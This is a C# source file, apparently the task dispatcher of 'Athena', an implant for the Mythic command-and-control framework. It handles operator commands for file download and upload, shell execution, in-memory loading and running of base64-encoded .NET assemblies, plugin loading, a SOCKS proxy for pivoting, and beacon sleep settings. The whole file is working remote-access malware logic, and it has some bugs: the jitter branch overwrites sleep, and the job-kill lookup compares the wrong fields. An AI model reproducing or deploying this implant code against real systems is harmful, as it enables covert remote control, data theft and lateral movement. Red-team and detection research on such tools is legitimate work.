﻿using Athena.Commands.Model;
using Athena.Models.Athena.Assembly;
using Athena.Models.Athena.Commands;
using Athena.Models.Mythic.Tasks;
using Athena.Utilities;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;

namespace Athena.Commands
{

    public class CommandHandler
    {
        static string executeAssemblyTask = "";

        public static void StartJob(MythicJob job)
        {
            switch (job.task.command)
            {
                case "download":
                    Task.Run(() => {
                        MythicDownloadJob j = new MythicDownloadJob(job);
                        Dictionary<string, string> par = JsonConvert.DeserializeObject<Dictionary<string, string>>(job.task.parameters);
                        j.path = par["file"];
                        FileHandler.downloadFile(j);
                    });
                    break;
                case "execute-assembly":
                    if (executeAssemblyTask != "")
                    {
                        completeJob(ref job, "Failed to load assembly. Another assembly is already executing.", true);
                    }
                    else
                    {
                        var t = Task.Run(() =>
                        {
                            job.started = true;
                            job.cancellationtokensource.Token.ThrowIfCancellationRequested();
                            executeAssemblyTask = job.task.id;
                            ExecuteAssembly ea = JsonConvert.DeserializeObject<ExecuteAssembly>(job.task.parameters);
                            job.taskresult = "";
                            job.hasoutput = true;

                            using (var consoleWriter = new ConsoleWriter()) {
                                var origStdout = Console.Out;
                                try
                                {
                                    consoleWriter.WriteLineEvent += consoleWriter_WriteLineEvent;
                                    //Set output for our ConsoleWriter
                                    Console.SetOut(consoleWriter);
                                    //Start a new thread for our blocking Execute-Assembly
                                    try
                                    {
                                        job.hasoutput = true;
                                        AssemblyHandler.ExecuteAssembly(Misc.Base64DecodeToByteArray(ea.assembly), ea.arguments);
                                        
                                        //Assembly finished executing.
                                        executeAssemblyTask = "";
                                        job.complete = true;
                                        Console.SetOut(origStdout);
                                        return;
                                    }
                                    catch (Exception)
                                    {
                                        //Cancellation was requested, clean up.
                                        executeAssemblyTask = "";
                                        completeJob(ref job, "", true);
                                        Console.SetOut(origStdout);
                                        Globals.alc.Unload();
                                        Globals.alc = new ExecuteAssemblyContext();
                                        return;
                                    }
                                }
                                catch (Exception e)
                                {
                                    executeAssemblyTask = "";
                                    completeJob(ref job, e.Message, true);
                                    Console.SetOut(origStdout);
                                }
                            }
                        }, job.cancellationtokensource.Token);
                    }
                    break;
                case "exit":
                    Environment.Exit(0);
                    break;
                case "jobs":
                    Task.Run(() => {
                        string output = "ID\t\t\t\t\t\tName\t\tStatus\r\n";
                        output += "-----------------------------------------------------------------------------------\r\n";
                        foreach (var job in Globals.jobs)
                        {
                            if (job.Value.started &! job.Value.complete)
                            {
                                output += String.Format("{0}\t\t{1}\t\t\t{2}\r\n", job.Value.task.id, job.Value.task.command, "Started");
                            }
                            else if (job.Value.complete)
                            {
                                output += String.Format("{0}\t\t{1}\t\t\t{2}\r\n", job.Value.task.id, job.Value.task.command, "Completed");
                            }
                            else
                            {
                                output += String.Format("{0}\t\t{1}\t\t\t{2}\r\n", job.Value.task.id, job.Value.task.command, "Not Started");
                            }
                        }
                        completeJob(ref job, output, false);
                    }, job.cancellationtokensource.Token);
                    break;
                case "jobkill":
                    Task.Run(() =>
                    {
                        MythicJob job = Globals.jobs.FirstOrDefault(x => x.Value.task.id == x.Value.task.parameters).Value;
                        if (job != null)
                        {
                            //Attempt the cancel.
                            job.cancellationtokensource.Cancel();

                            //Wait to see if the cancel took.
                            for (int i = 0; i != 31; i++)
                            {
                                //Job exited successfully
                                if (job.complete)
                                {
                                    completeJob(ref job, $"Task {job.task.parameters} exited successfully.", false);
                                    break;
                                }
                                //Job may have failed to cancel
                                if (i == 30 && !job.complete)
                                {
                                    completeJob(ref job, $"Unable to cancel Task: {job.task.parameters}. Request timed out.", true);
                                }
                                
                                //Wait 1s, This will be 30s once all the loops complete.
                                Thread.Sleep(1000);
                            }
                        }
                        else
                        {
                            completeJob(ref job, $"Task {job.task.parameters} not found!", true);
                        }
                    }, job.cancellationtokensource.Token);
                    break;
                case "load":
                    Task.Run(() =>
                    {
                        LoadCommand lc = JsonConvert.DeserializeObject<LoadCommand>(job.task.parameters);
                        completeJob(ref job, AssemblyHandler.LoadCommand(Misc.Base64DecodeToByteArray(lc.assembly), lc.name), false);
                    }, job.cancellationtokensource.Token);
                    break;
                //Can these all be merged into one and handled on the server-side?
                case "load-assembly":
                    Task.Run(() => {
                        try
                        {
                            LoadAssembly la = JsonConvert.DeserializeObject<LoadAssembly>(job.task.parameters);
                            completeJob(ref job, AssemblyHandler.LoadAssembly(Misc.Base64DecodeToByteArray(la.assembly)), false);
                        }
                        catch (Exception e)
                        {
                            completeJob(ref job, e.Message, true);
                        }
                    }, job.cancellationtokensource.Token);
                    break;
                case "reset-assembly-context":
                    Task.Run(() =>
                    {
                        completeJob(ref job, AssemblyHandler.ClearAssemblyLoadContext(), false);
                    }, job.cancellationtokensource.Token);
                    break;
                case "shell":
                    Task.Run(() =>
                    {
                        Execution.ShellExec(job);
                    }, job.cancellationtokensource.Token);
                    break;
                case "sleep":
                    var sleepInfo = JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters);
                    if (sleepInfo.ContainsKey("sleep"))
                    {
                        try
                        {
                            Globals.mc.MythicConfig.sleep = int.Parse(sleepInfo["sleep"].ToString());
                        }
                        catch
                        {
                            job.taskresult += "Invalid sleeptime specified." + Environment.NewLine;
                            job.errored = true;
                        }
                    }
                    if (sleepInfo.ContainsKey("jitter"))
                    {
                        try
                        {
                            Globals.mc.MythicConfig.sleep = int.Parse(sleepInfo["jitter"].ToString());
                        }
                        catch
                        {
                            job.taskresult += "Invalid jitter specified." + Environment.NewLine;
                            job.errored = true;
                        }
                    }
                    if (!job.errored)
                    {
                        completeJob(ref job, "Sleep updated successfully.", false);
                    }
                    else
                    {
                        completeJob(ref job, job.taskresult, true);
                    }
                    break;
                case "socks":
                    var socksInfo = JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters);
                    if (socksInfo["action"].ToString() =="start")
                    {
                        if (Globals.socksHandler == null)
                        {
                            Globals.socksHandler = new SocksHandler();
                            Globals.socksHandler.Start();
                        }
                        else
                        {
                            if (Globals.socksHandler.running)
                            {
                                completeJob(ref job, "SocksHandler is already running.", true);
                            }
                            else
                            {
                                Globals.socksHandler.Start();
                                completeJob(ref job, "Socks started.", false);
                            }
                        }
                    }
                    else
                    {
                        try
                        {
                            if (Globals.socksHandler != null)
                            {
                                Globals.socksHandler.Stop();
                                completeJob(ref job, "Socks stopped.", false);
                            }
                            else
                            {
                                completeJob(ref job, "Socks is not running.", true);
                            }
                        }
                        catch
                        {
                            completeJob(ref job, "Socks is not running.", true);
                        }
                    }
                    break;
                case "stop-assembly":
                    Task.Run(() => {
                        completeJob(ref job, "This function does not work properly yet.", true);
                    }, job.cancellationtokensource.Token);
                    break;
                case "upload":
                    var uploadTask = Task.Run(() =>
                    {
                        try
                        {
                            if (!Globals.uploadJobs.ContainsKey(job.task.id)){
                                MythicUploadJob uj = new MythicUploadJob(job);
                                Dictionary<string, string> par = JsonConvert.DeserializeObject<Dictionary<string, string>>(job.task.parameters);
                                uj.path = par["remote_path"];
                                uj.file_id = par["file"];
                                uj.task = job.task;
                                uj.chunk_num = 1;
                                job.started = true;
                                job.hasoutput = true;
                                job.taskresult = "";
                                
                                //Add job to job tracking Dictionary
                                Globals.uploadJobs.Add(uj.task.id, uj);
                            }
                        }
                        catch (Exception e)
                        {
                            completeJob(ref job, e.Message, true);
                        }

                    }, job.cancellationtokensource.Token);
                    break;
                default:
                    var defaultTask = Task.Run(() =>
                    {
                        checkAndRunPlugin(job);
                    }, job.cancellationtokensource.Token);
                    break;
            }
        }
        static void consoleWriter_WriteLineEvent(object sender, ConsoleWriterEventArgs e)
        {
            try
            {
                MythicJob job = Globals.jobs.FirstOrDefault(x => x.Value.task.id == executeAssemblyTask).Value;
                job.taskresult += e.Value + Environment.NewLine;
                job.hasoutput = true;
            }
            catch (Exception)
            {
                //Fail silently
            }
        }
        static void checkAndRunPlugin(MythicJob job)
        {
            if (Globals.loadedcommands.ContainsKey(job.task.command))
            {
                PluginResponse pr = AssemblyHandler.RunLoadedCommand(job.task.command, JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters));
                completeJob(ref job, pr.output, !pr.success);
            }
            else
            {
                completeJob(ref job, "Plugin not loaded. Please use the load command to load the plugin!", true);
            }
        }

        private static void completeJob(ref MythicJob job, string output, bool error)
        {
            job.taskresult = output;
            job.complete = true;
            job.errored = error;
            if (!String.IsNullOrEmpty(output))
            {
                job.hasoutput = true;
            }
            else
            {
                job.hasoutput = false;
            }
        }
    }
}
